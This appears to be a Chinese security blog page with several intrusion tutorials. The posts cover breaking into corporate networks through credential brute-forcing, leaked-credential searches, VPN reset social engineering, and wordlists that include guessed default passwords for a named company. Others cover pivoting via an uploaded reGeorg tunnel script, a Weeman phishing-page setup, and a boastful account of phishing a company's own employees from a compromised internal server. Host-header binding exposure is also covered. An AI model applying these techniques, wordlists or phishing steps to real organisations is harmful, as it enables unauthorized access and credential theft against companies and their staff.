<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description">
<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">
<meta name="twitter:description">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-e6-b5-85-e8-b0-88-e4-bc-81-e4-b8-9a-e7-bd-91-e7-bb-9c-e8-be-b9-e7-95-8c-3" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/03/11/e6-b5-85-e8-b0-88-e4-bc-81-e4-b8-9a-e7-bd-91-e7-bb-9c-e8-be-b9-e7-95-8c-3/" class="article-date">
  <time datetime="2016-03-11T04:01:44.000Z" itemprop="datePublished">2016-03-11</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/内网/">内网</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/11/e6-b5-85-e8-b0-88-e4-bc-81-e4-b8-9a-e7-bd-91-e7-bb-9c-e8-be-b9-e7-95-8c-3/">浅谈企业网络边界</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p># </p>
<h2 id="0x01-企业网络边界"><a href="#0x01-企业网络边界" class="headerlink" title="0x01 企业网络边界"></a>0x01 企业网络边界</h2><div class="line_item" data-line="12"></div>

<p>  我们知道既然要从外围进入内网，那么必然要做的一件事情就是跨越边界，所有这个命门我们也就自然应该在企业的内外网边界上来寻找。<br>那为什么企业需要在内外网之间部署这样一个边界呢？我们只要作为一个大企业来说他会有上百甚至上千个业务线，而安全团队或许只有几十人，那这几十人要保证这上千个业务线的安全，显然如果用布点的方式肯定无法完成覆盖的，所以企业在思考如何进行防御的时候会选择区域性防守。<br>所谓区域性防守就是把重点需要保护的业务&amp;数据放到一个指定的区域，让后对这个区域进行隔离，并指定好进入这个区域的防火墙策略。然后定期对这个区域进行安全检查。<br>如果这样实施的很好，看起来一切都很完美。但是事实上并不尽人意，事实是这样的，在企业内部通常业务部门是会比安全部门强势的，这一点我相信大家都知道，那么就会导致一个问题，安全部门总想着把业务圈起来，各种严格的策略和规范实施上去，而业务部门在业务快速迭代的背景下就会很难去严格执行你的策略。他们会要求你针对他特殊的业务场景来制定专门的策略，甚至部署到非隔离区域，而且这样的情况不在少数。如此一来安全部门需要维护的策略和规范就会越来越多。而这将直接导致策略及规范的执行越来越差。</p>
<div class="line_item" data-line="18"></div>

<h2 id="0x02-合法的入口"><a href="#0x02-合法的入口" class="headerlink" title="0x02 合法的入口"></a>0x02 合法的入口</h2><div class="line_item" data-line="20"></div>

<h3 id="1-物理接触"><a href="#1-物理接触" class="headerlink" title="1. 物理接触"></a>1. 物理接触</h3><div class="line_item" data-line="22"></div>

<p>  如果你能直接物理接触公司内网（插网线或者连接wifi），我只能说你牛X。案例：</p>
<ul>
<li><a href="http://www.wooyun.org/bugs/wooyun-2015-0108465" target="_blank" rel="external">看我如何用wifi万能钥匙物理撸穿京东漫游内网</a></li>
<li><a href="http://www.wooyun.org/bugs/wooyun-2010-0149911" target="_blank" rel="external">线下测试最终进入小米关键系统</a><div class="line_item" data-line="26"></div>

</li>
</ul>
<p>  这两个案例都是通过wifi万能钥匙（手机root后即可看到连接过的wifi密码），获取到wifi密码，直接连入内网。内网的系统安全性一般不高，或弱口令、xss、注入。甚至还可以进行嗅探、钓鱼及流量劫持等。</p>
<div class="line_item" data-line="28"></div>

<h3 id="2-非物理接触"><a href="#2-非物理接触" class="headerlink" title="2. 非物理接触"></a>2. 非物理接触</h3><div class="line_item" data-line="29"></div>

<p>  大型的公司，一般都会有很多的管理系统，如果每个系统都分配给员工账号的话，那么需要记住太多的账号密码了。所以大型公司通常有一个主账号，一般是OA系统、vpn或者统一认证入口，员工登录这个账号，可对其他的系统进行授权。这种方式虽然解放了员工，同时相对也比较安全（账号密码太多难免有弱口令）。但是凡事有利有弊，万一某一名员工的账号泄露或者是弱口令，那么它所授权的所有系统都可被攻击者访问。</p>
<div class="line_item" data-line="31"></div>

<h4 id="2-1-获取用户名密码的方式"><a href="#2-1-获取用户名密码的方式" class="headerlink" title="2.1 获取用户名密码的方式"></a>2.1 获取用户名密码的方式</h4><p>&nbsp;</p>
<ul>
<li>用户名密码爆破</li>
</ul>
<p>   最常用方法当然是爆破。若统一认证处无法爆破，推荐爆破邮箱；若登录处有验证码，但是不复杂，推荐pkav的可识别简单验证码的爆破工具；若是ip限制，看是否是cookie记录限制，若不是又没有很多代理的话，还是放弃吧。对于用户名，最好是能收集到他们公司的一些人名或者是用户名，如果收集不到就使用自带的top500人名。密码一般top100。</p>
<p>参考：</p>
<blockquote>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0133393" target="_blank" rel="external">中粮集团某处设计不当导致进入内网（可入多系统/泄露大量信息）</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0165182" target="_blank" rel="external">途牛内网漫游（内网大量数据库权限/大量用户信息/天猫商城、积分商城及主站后台权限）</a></p>
</blockquote>
<ul>
<li>社工（github、社工库）</li>
</ul>
<p>   都说现在是大数据的时代，社工永远是个有效方法。程序猿们一不小心把代码传到github上，代码里恰巧有邮箱，密码等信息，很容易被攻击者搜索到。常用语法，以饿了么为例</p>
<pre class="xiaoshujiang_code_container">smtp ele.me
ele.me pass
mail @ele.me
.......</pre>

<p>   拥有大数据，直接在社工库里搜索某公司的企业邮箱域名，如@ele.me。有的人虽然密码挺复杂，但如果是万年一个密码，也是相当的危险。<br>参考：</p>
<blockquote>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0147179" target="_blank" rel="external">美团网某处内部邮箱账号泄露可登录（已连接vpn）</a></p>
</blockquote>
<ul>
<li>密码重置</li>
</ul>
<p>   试想如果员工想更改自己的vpn密码，那么有什么好的方法呢？如果不是要员工直接走到运维办公室里，出示证件的话，那么就一定有东西可被两方信任，通常是邮箱+个人信息。如果我直接发邮件给运维，说我vpn密码忘记了，再出示一些个人信息，你说运维会不会给我改？<br>参考：</p>
<blockquote>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0150946" target="_blank" rel="external">华润双鹤由邮箱到集团内网漫游</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0150613" target="_blank" rel="external">控制魅族在线商店突破vpn双因素进入内网（涉及大量用户详细订单/手机IMEI等）</a></p>
<div class="line_item" data-line="63"></div>

</blockquote>
<h4 id="2-2-谈谈用户名和密码"><a href="#2-2-谈谈用户名和密码" class="headerlink" title="2.2 谈谈用户名和密码"></a>2.2 谈谈用户名和密码</h4><p>&nbsp;</p>
<ul>
<li>用户名</li>
</ul>
<p>   为了方便管理以及员工方便记忆，员工的用户名一般是自己的拼音，最常用的是这样的：</p>
<pre class="xiaoshujiang_code_container">zhangwei
wangwei
wangfang</pre>

<p>   还有这样的</p>
<pre class="xiaoshujiang_code_container">wei.zhang
wei.wang
fang.wang</pre>

<p>   正序，反序，简写可组合多达6种</p>
<pre class="xiaoshujiang_code_container">zhangwei
zw
zhang.wei
wei.zhang
zhangw
w.zhang</pre>

<p>   所以也不是看到登录口，就拿top500人名字典去尝试；事先清楚某公司的用户名规则，会使得爆破的准确性和效率更高。话说随着人口的增长（作文写多了），大公司重名的概率，或者相似名（拼音相同）的概率是相当大的。如<code>liwei: 李伟，李威，李维，李卫</code>,那么为了区分这种情况，就有了下面的：</p>
<pre class="xiaoshujiang_code_container">liwei01
liwei02
liwei03
......</pre>

<p>当然最准确的还是先拿下某个邮箱或oa账号后，将里面的通讯录导出来！！！<br>参考：</p>
<blockquote>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0134278" target="_blank" rel="external">对中粮集团的多个系统的渗透测试（已入多个系统）</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0133495" target="_blank" rel="external">字典大法好之可进入百度糯米运营支撑平台/大客户广告系统/可能进一步入内网</a></p>
</blockquote>
<ul>
<li>密码</li>
</ul>
<p>  密码向来是个难题。这里我把密码分成两种：一是通用型，类似弱口令top10，top100等，相信每个大牛手里都有自己独特的不轻易外传的密码字典；二是针对特定的用户名、公司、系统，从而生成的字典。<br>通用的top100我就不说了，但是有一类密码普通人不常用，但程序猿特别爱用的，人称<strong>滚键盘</strong>：</p>
<pre class="xiaoshujiang_code_container">q2w3e4r5t
1qaz@WSX
123456asd
1q2w3e
1qaz@WSX
ZAQ!xsw2
ZAQ!2wsx
2wsx#EDC
@WSX3edc</pre>

<p>  这种密码我建议可以加入自己的字典，通常有奇效。<br>如果已经有了可靠的用户名，那么不妨针对这些用户名制作相应的字典，例如<code>liwei</code>，那么加上生日、公司简称等，可能就有下面的：</p>
<pre class="xiaoshujiang_code_container">liwei
liwei1989
liwei@1989
1iwei@scu
liweiscu</pre>

<p>  公司在给员工分配密码的时候，一般都是会有一个默认密码，员工拿到后进行修改。但若是某些员工没有更改密码，那么就可以被利用了。不同公司的默认密码不一样，例如饿了么的常用默认密码，和其公司域名有很大的关系。</p>
<p><pre class="xiaoshujiang_code_container">ele.me<br>ele@123<br>ele.me@123<br>ele.me5121314<br>ele@123456789<br>eleme@3456789<br>Hello_eleme123</pre></p>
<div class="line_item" data-line="135"></div>

<h2 id="0x03-不合法的入口"><a href="#0x03-不合法的入口" class="headerlink" title="0x03 不合法的入口"></a>0x03 不合法的入口</h2><blockquote>
<p>不合法的入口一般指利用漏洞获取某内网机器权限，或者是利用漏洞绕过边界，这方面就不多说。</p>
</blockquote>
<ul>
<li>利用各种漏洞，获取边界某台服务器权限<br>这是最常见的方式，漏洞包括web漏洞、主机漏洞及其他。正如前面所说的，大公司的安全运维人员需要维护数以千计的业务，其中很多的边缘业务肯定是无法完全的保护起来，这些边缘的业务可能长时间无人维护，但却又是在边界上可和内网通信。正所谓“千里之堤，毁于蚁穴”，企业的内部往往是很脆弱的，一旦让攻击者进入边界以内，就如同砧板上的肉，任人宰割。<br>案例：<br><a href="http://www.wooyun.org/bugs/wooyun-2015-0129012" target="_blank" rel="external">东风汽车公司某系统漏洞导致内网漫游（控制大量服务器/数据库/ftp，大量敏感数据泄漏)</a></li>
<li>host绑定，直接访问内网业务<br>简单来说就是服务器内网外网双网卡，web服务器没能对访问者来源做检查，访问者在hosts文件中将内网域名与外网ip绑定，可直接访问内网的业务。<br>案例及说明：<br><a href="http://wps2015.jinglingshu.org/?p=172" target="_blank" rel="external">关于服务器的host绑定的不安全因素</a></li>
<li>SSRF探测内网<br>SSRF(Server-Side Request Forgery:服务器端请求伪造)，是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统)。当然大多数的ssrf能探测到的内网信息有限，可辅助其他漏洞进行渗透。<br>案例：<br><a href="http://www.wooyun.org/bugs/wooyun-2015-0162607" target="_blank" rel="external">知乎主站一处SSRF漏洞可探测内网</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-099070" target="_blank" rel="external">百度某个从SSRF到内网WebShell</a><br>挖掘经验：<br><a href="http://bobao.360.cn/learning/detail/240.html" target="_blank" rel="external">SSRF漏洞的挖掘经验</a><div class="line_item" data-line="156"></div>

</li>
</ul>
<h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><div class="line_item" data-line="158"></div>

<p>  正如电影《Who Am I – No System Is Safe》中描述的一样，没有真正安全的系统，自然也没有真正安全的内网防护体系。对于一个大型互联网公司来说，其实并不是因为他们安全做的不够好，而是守需要考虑的是一个面，而攻只需要一个点，对一个点进行深入的挖掘，一定可以找到突破口，而本身企业的安全建设其实也是一直在提高攻击门槛，并不是无懈可击。</p>
<hr>
<div class="line_item" data-line="162"></div>

<p>参考链接：<br><a href="http://drops.wooyun.org/tips/7831" target="_blank" rel="external">http://drops.wooyun.org/tips/7831</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/03/11/e6-b5-85-e8-b0-88-e4-bc-81-e4-b8-9a-e7-bd-91-e7-bb-9c-e8-be-b9-e7-95-8c-3/" data-id="cimy8bfbv000d74gc75r0o3bc" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e4-b9-8bsocks5-e4-bb-a3-e7-90-86-ef-bc-88regeorgproxifier-e8-af-a6-e7-bb-86-e9-85-8d-e7-bd-ae-e8-af-b4-e6-98-8e-ef-bc-89" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/03/02/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e4-b9-8bsocks5-e4-bb-a3-e7-90-86-ef-bc-88regeorgproxifier-e8-af-a6-e7-bb-86-e9-85-8d-e7-bd-ae-e8-af-b4-e6-98-8e-ef-bc-89/" class="article-date">
  <time datetime="2016-03-02T08:48:10.000Z" itemprop="datePublished">2016-03-02</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/工具/">工具</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2016/03/02/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e4-b9-8bsocks5-e4-bb-a3-e7-90-86-ef-bc-88regeorgproxifier-e8-af-a6-e7-bb-86-e9-85-8d-e7-bd-ae-e8-af-b4-e6-98-8e-ef-bc-89/">内网渗透之socks5代理（reGeorg+proxifier详细配置说明）</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><span style="font-family: 'Microsoft Yahei'; font-size: medium;">1. 首先我们需要明白正向代理和反向代理的区别</span></p>
<p><span style="font-family: 'Microsoft Yahei'; font-size: medium;">1.1 正向代理(Forward Proxy)</span></p>
<hr>
<p>[python]Lhost－－&gt;proxy－－&gt;Rhost[/python]</p>
<p><span style="font-family: 'Microsoft Yahei';">Lhost为了访问到Rhost，向proxy发送了一个请求并且指定目标是Rhost，然后proxy向Rhost转交请求并将获得的内容返回给Lhost，简单来说正向代理就是proxy代替了我们去访问Rhost。</span></p>
<p><span style="font-family: 'Microsoft Yahei'; font-size: medium;">1.2 反向代理（reverse proxy）</span></p>
<hr>
<p>[python]Lhost&lt;－－&gt;proxy&lt;－－&gt;firewall&lt;－－&gt;Rhost[/python]</p>
<p><span style="font-family: 'Microsoft Yahei';">和正向代理相反（废话），Lhost只向proxy发送普通的请求，具体让他转到哪里，proxy自己判断，然后将返回的数据递交回来，这样的好处就是在某些防火墙只允许proxy数据进出的时候可以有效的进行穿透。</span></p>
<p><span style="font-family: 'Microsoft Yahei';">而我们平常使用的reDuh、tunna，和reGeorg一样，都是正向代理。一般都是用户上传一个代理脚本到服务器端，本地的程序去连接服务器上的脚本，脚本程序做代理转发端口和流量。<br></span></p>
<p><span style="font-family: 'Microsoft Yahei'; font-size: medium;">2. 工具介绍</span></p>
<p><span style="font-family: 'Microsoft Yahei'; font-size: medium;">2.1 reGeorg</span></p>
<p><span style="font-family: 'Microsoft Yahei';">    reGeorg是reDuh的继承者，利用了会话层的socks5协议，效率更高。</span></p>
<p><span style="font-family: 'Microsoft Yahei';">    reGeorg下载地址：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="external">下载</a></span></p>
<p><span style="font-family: 'Microsoft Yahei'; font-size: medium;">2.2 proxifier</span></p>
<p><span style="font-family: 'Microsoft Yahei';">   Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。<br></span></p>
<p><span style="font-family: 'Microsoft Yahei';">   下载地址：<a href="https://www.proxifier.com/" target="_blank" rel="external">下载</a></span></p>
<p><span style="font-family: 'Microsoft Yahei';">   激活码：   <a href="http://wenku.baidu.com/link?url=T9od33JuA7jjxzfyV-wOjsYyARbVXwuXs2GwWwXLkX6vxRU4Rj0p_e2_0l1A0-WT9NOs3sh1OqDbYBgFYXLyjfconba4FF4iqdoz-tV5GH_" target="_blank" rel="external">查看</a></span></p>
<p><span style="font-family: 'Microsoft Yahei'; font-size: medium;">3. 工具配置</span></p>
<p><span style="font-family: 'Microsoft Yahei'; font-size: medium;">   先将reGeorg的对应脚本上传到服务器端，直接访问显示“Georg says, ‘All seems fine’”，表示脚本运行正常</span></p>
<p><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2016/03/clipboard.png" alt="clipboard"></p>
<p><span style="font-family: 'Microsoft Yahei';">运行py程序：<code>python reGeorgSocksProxy.py -p 8888 -u http:``//[www.exemple.com/test/tunnel.jsp](http://www.exemple.com/test/tunnel.jsp)</code></span></p>
<p><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2016/03/clipboard-1.png" alt="clipboard (1)"></p>
<p>将proxifier打开，在Proxy Server中这样配置</p>
<p><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2016/03/clipboard-2.png" alt="clipboard (2)"></p>
<p><span style="font-family: 'Microsoft Yahei';">然后在远程桌面程序上右键，以Proxifier选择“Proxy SOCKS5 127.0.0.1”打开。ipconfig查询内网机器的ip</span></p>
<p><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2016/03/clipboard-3.png" alt="clipboard (3)"></p>
<p><span style="font-family: 'Microsoft Yahei';">直接在远程连接上输入内网机器的内网ip</span></p>
<p><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2016/03/clipboard-4.png" alt="clipboard (4)"></p>
<p><span style="font-family: 'Microsoft Yahei';">点击连接即可。</span></p>
<p>&nbsp;</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2016/03/02/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e4-b9-8bsocks5-e4-bb-a3-e7-90-86-ef-bc-88regeorgproxifier-e8-af-a6-e7-bb-86-e9-85-8d-e7-bd-ae-e8-af-b4-e6-98-8e-ef-bc-89/" data-id="cimy8bfbl000574gcm2ilh3sj" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-e5-82-bb-e7-93-9c-e5-bc-8f-e9-80-9a-e7-94-a8-e9-92-93-e9-b1-bc-e5-b7-a5-e5-85-b7weeman1-5-greentree" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/11/10/e5-82-bb-e7-93-9c-e5-bc-8f-e9-80-9a-e7-94-a8-e9-92-93-e9-b1-bc-e5-b7-a5-e5-85-b7weeman1-5-greentree/" class="article-date">
  <time datetime="2015-11-10T13:55:18.000Z" itemprop="datePublished">2015-11-10</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/工具/">工具</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/11/10/e5-82-bb-e7-93-9c-e5-bc-8f-e9-80-9a-e7-94-a8-e9-92-93-e9-b1-bc-e5-b7-a5-e5-85-b7weeman1-5-greentree/">傻瓜式通用钓鱼工具Weeman1.5-GreenTree</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h6 id="写在作者前面：这个工具确实比较好用，对于作者在文章最后的内网利用技巧，觉得还是有可行之处，虽然可能动静也比较大。"><a href="#写在作者前面：这个工具确实比较好用，对于作者在文章最后的内网利用技巧，觉得还是有可行之处，虽然可能动静也比较大。" class="headerlink" title="写在作者前面：这个工具确实比较好用，对于作者在文章最后的内网利用技巧，觉得还是有可行之处，虽然可能动静也比较大。"></a>写在作者前面：这个工具确实比较好用，对于作者在文章最后的内网利用技巧，觉得还是有可行之处，虽然可能动静也比较大。</h6><p>相比大家都听过S.E.T社会工程学工具包吧，与其说是一个工具包，我个人理解更像是个框架，里面功能非常丰富，但是安装使用不太便捷小巧，入门不太容易，借此，容我推荐一款老外写的阉割版钓鱼工具Weeman。<br>之前我在FQ的时候无意间在老外的博客发现这么个东西，百度了一下，国内很少甚至可以说没有介绍，估计是太low了，功能很简洁，先看看吧<br><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110912200780240.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110912200780240.png" alt="2015110912200780240"></a></p>
<p>只有四条命令</p>
<p><pre class="lang:default decode:true">  show   : show default settings. ＃显示默认配置<br>  set    : set value for option (set &lt;option&gt; &lt;value&gt;). ＃设定目标的url以及登录页面（我英文烂，你可以这么理解吧）<br>  run    : start the server. ＃（启动服务）<br>  clear  : clear screen. ＃（清屏，然并卵）<br>  help   : show help or (help &lt;option&gt;.) ＃显示使用说明以及对象<br>  quit   : quit. ＃退出</pre><br>以下拿Tangscan做个案例.<a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110912385467090.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110912385467090.png" alt="2015110912385467090"></a><br>先拿到登录页面，然后通过抓包获取其登录接口。</p>
<p><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110912534556090.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110912534556090.png" alt="2015110912534556090"></a></p>
<p><pre class="lang:default decode:true">( weeman ) : set url <a href="http://www.tangscan.com/login" target="_blank" rel="external">http://www.tangscan.com/login</a> #设置静态页面，即登录页面<br>( weeman ) : set action_url <a href="http://www.tangscan.com/login/login" target="_blank" rel="external">http://www.tangscan.com/login/login</a> ＃活动页面，即跳转页面，登录接口。<br>( weeman ) : set port 2015 ＃设置运行端口<br>( weeman ) : run ＃执行脚本</pre><br>接着访问127.0.0.1:2015<br><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913431066771.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913431066771.png" alt="2015110913431066771"></a><br>然后输入帐号密码，可以看到这里已经抓到账户密码了<br><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913430174908.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913430174908.png" alt="2015110913430174908"></a></p>
<p>好玩的地方在于，就算拿输入正确密码，也可以直接正常登录跳转到正常页面中。<br><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913460792632.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913460792632.png" alt="2015110913460792632"></a><br><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913461680006.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913461680006.png" alt="2015110913461680006"></a></p>
<p>密码也可以正常抓取<br><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913474333611.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913474333611.png" alt="2015110913474333611"></a></p>
<p>源码会下载在根目录<a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913544738601.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913544738601.png" alt="2015110913544738601"></a></p>
<p>抓到的密码也在根目录下保存。<br><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913564322953.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110913564322953.png" alt="2015110913564322953"></a></p>
<p>最后是显示一个历史纪录<br><a href="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110914013412557.png" target="_blank" rel="external"><img src="http://wps2015.jinglingshu.org/wp-content/uploads/2015/11/2015110914013412557.png" alt="2015110914013412557"></a></p>
<p>其实就是四条命令，上面只是详细说明了一些步骤。。</p>
<p>一个成功案例<br>在一次周末中，我在拿到内网中一个服务器，为了不打草惊蛇，并没有嗅探，我使用该方法，抓取某个内网系统，然后把自己服务器的地址再以邮件的形式群发给其他企业人员，声称原服务器遭到黑客攻击，临时转移到其他服务器上，请尽快修改密码。<br>然后。。。哗啦啦的一堆密码就来了，服务器地址也的确是自己公司的服务器啊，也可以的确正常登录。一般人很难辨认。</p>
<p>＃测试环境<br>Linux (any)<br>Mac (any)<br>Windows (Not tested)</p>
<p>＃安装环境<br>Python &lt;= 2.7.<br>Python BeautifulSoup 4</p>
<p>下载地址：<code>https://github.com/Hypsurus/weeman</code></p>
<p>转自：<a href="http://zone.wooyun.org/content/23827" target="_blank" rel="external">http://zone.wooyun.org/content/23827</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2015/11/10/e5-82-bb-e7-93-9c-e5-bc-8f-e9-80-9a-e7-94-a8-e9-92-93-e9-b1-bc-e5-b7-a5-e5-85-b7weeman1-5-greentree/" data-id="cimy8bfbe000174gcbxt6i368" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-e5-85-b3-e4-ba-8e-e6-9c-8d-e5-8a-a1-e5-99-a8-e7-9a-84host-e7-bb-91-e5-ae-9a-e7-9a-84-e4-b8-8d-e5-ae-89-e5-85-a8-e5-9b-a0-e7-b4-a0" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2015/09/29/e5-85-b3-e4-ba-8e-e6-9c-8d-e5-8a-a1-e5-99-a8-e7-9a-84host-e7-bb-91-e5-ae-9a-e7-9a-84-e4-b8-8d-e5-ae-89-e5-85-a8-e5-9b-a0-e7-b4-a0/" class="article-date">
  <time datetime="2015-09-29T08:24:59.000Z" itemprop="datePublished">2015-09-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/09/29/e5-85-b3-e4-ba-8e-e6-9c-8d-e5-8a-a1-e5-99-a8-e7-9a-84host-e7-bb-91-e5-ae-9a-e7-9a-84-e4-b8-8d-e5-ae-89-e5-85-a8-e5-9b-a0-e7-b4-a0/">关于服务器的host绑定的不安全因素</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>1、host主机头<br>host主机头绑定是很多网站常用的一种一机多站的实现方法,相对于使用不同端口来实现一机多站要安全许多,因为端口可以通过暴力手段找到,而host绑定就要难破解很多,因为需要IP和主机名的对应.</p>
<p>2、漏洞成因及危害<br>很多网站为了方便管理和节省服务器成本,将内网管理站点和外网站点放置在同一服务器下,使用一机多站来进行隔离.</p>
<p>很多情况下一台服务器安装两块网卡,分别接入外网和内网,方便公网访问公开站点,内网访问管理站点.并绑定host.</p>
<p>例如:</p>
<p><pre class="lang:default highlight:0 decode:true">xxx.com为公开站点,并且指向IP为公网网卡.<br>admin.xxx.com为管理站点,并且指向内网网卡.</pre><br>看上去好像管理站点admin.xxx.com必须在内网才能访问但是却忽略了host绑定的问题.</p>
<p>但是当我们将外网IP地址强制绑定到admin.xxx.com的时候web服务器又没有做来源检查,那么我们就可以通过外网访问到本来应该只有内网才能访问的管理站点了.</p>
<p>并且由于是内网站点很多情况下管理员为了方便都是弱密码,或者直接未授权访问等</p>
<p>3、漏洞的利用<br>利用的话可以直接使用域名的一个暴力猜解</p>
<p>将外网IP和内网IP的域名全部记录下来</p>
<p>例如</p>
<p><pre class="lang:default highlight:0 decode:true">xxx.com ip 1.1.1.1<br>admin.xxx.com ip 10.0.0.1</pre><br>再使用工具将内网域名绑定到外网站点的IP上</p>
<p>写入hosts文件</p>
<p><pre class="lang:default highlight:0 decode:true">1.1.1.1 admin.xxx.com</pre><br>即可访问到内网站点了</p>
<p>4、漏洞案例<br><a href="http://www.wooyun.org/bugs/wooyun-2014-081180" target="_blank" rel="external">途牛另类方式导致内网部分敏感系统泄露</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-093577" target="_blank" rel="external">盛大某游戏GM工具注入进入后台</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-088352" target="_blank" rel="external">傲游内网不完整漫游(大量内外网源码可被泄漏)</a></p>
